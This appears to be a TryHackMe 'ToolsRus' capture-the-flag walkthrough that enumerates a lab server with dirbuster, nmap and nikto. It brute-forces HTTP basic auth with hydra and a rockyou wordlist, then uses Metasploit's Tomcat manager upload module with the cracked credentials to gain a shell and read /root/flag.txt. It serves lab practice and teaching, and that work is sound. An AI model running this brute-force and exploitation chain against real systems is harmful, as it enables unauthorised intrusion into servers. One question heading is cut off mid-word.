# [ToolsRus](https://tryhackme.com/room/toolsrus)

## Practise using tools such as dirbuster, hydra, nmap, nikto and metasploit

# ToysRus

## Your challenge is to use the tools listed below to enumerate a server, gathering information along the way that will eventually lead to you taking over the machine.

### What directory can you find, that begins with a "g"?

1. Use dirbuster, there is only one directory that begins with "g"

```Bash
dirbuster
```

![SCREEN01](https://github.com/user-attachments/assets/1b6bb738-59b8-4ba7-a024-c7b0e47c612f)
![SCREEN02](https://github.com/user-attachments/assets/1f05593f-6503-406c-8b8e-e7e70418b47d)

### Whose name can you find from this directory?

1. Just go to the endpoint

![SCREEN03](https://github.com/user-attachments/assets/a753ba28-f2ea-42a5-81ec-eb2a93a75fdf)

### What directory has basic authentication?

1. In dirbuster results there is one results with status 401

![SCREEN02](https://github.com/user-attachments/assets/8d05266d-5523-4e62-b919-4a765682e261)

### What is bob's password to the protected part of the website?

1. Use hydra

```Bash
hydra -l bob -P /root/Desktop/wordlists/rockyou.txt <IP> http-get /protected
```

- `-l`: Single username specification
- `-P`: Password list file path

![SCREEN04](https://github.com/user-attachments/assets/ec57e313-fb73-4f29-8853-9942b02e570e)

### What other port that serves a webs service is open on the machine?

1. This will be the next one after 80

```Bash
nmap -p- -sV <IP>
```

- `-p-`: Allow us to scan all 65535 TCP ports
- `-sV`: Probes ports to determine service/version info

![SCREEN05](https://github.com/user-attachments/assets/cff1ef5d-347b-4b4b-9a36-5df15c2e27f3)

### What is the name and version of the software running on the port from question 5?

It will be revealed after going to `http://<IP>:1234/`

![SCREEN06](https://github.com/user-attachments/assets/5384d412-b264-488f-ac81-5a466e1f0415)

### Use Nikto with the credentials you have found and scan the /manager/html directory on the port found above. How many docume0

```Bash
nikto -h http://<IP>:1234/manager/html -id bob:b**s
```

- `-h`: specifies the host (including port if non-standard)
- `-id`: provides credentials in username:password format

![SCREEN07](https://github.com/user-attachments/assets/0b7774db-1831-455c-b2e3-fd43442150db)

### What is the server version?

1. Use nikto on port 80

```Bash
nikto -h http://<IP>:80
```

- `-h`: Specifies the host target

![SCREEN08](https://github.com/user-attachments/assets/449b7d86-277a-4fa7-917b-e324c3aadee5)

### What version of Apache-Coyote is this service using?

1. We have found the answer in our nmap enumeration

![SCREEN05](https://github.com/user-attachments/assets/2c4b3f74-c026-4297-99a2-1a38f0a2a0cd)

### Use Metasploit to exploit the service and get a shell on the system. What user did you get a shell as?

1. Select the `multi/http/tomcat_mgr_upload`

```Bash
msfconsole
search tomcat
use 18
set RHOSTS <IP>
set RPORT 1234
set HttpUsername bob
set HttpPassword b**s
run
shell
id
```

![SCREEN09](https://github.com/user-attachments/assets/dce5ca95-0de8-4826-844c-c0fb78434fbe)

### What flag is found in the root directory?

```Bash
cat /root/flag.txt
```

![SCREEN10](https://github.com/user-attachments/assets/aa2f3327-0754-474a-bd26-13332f536442)
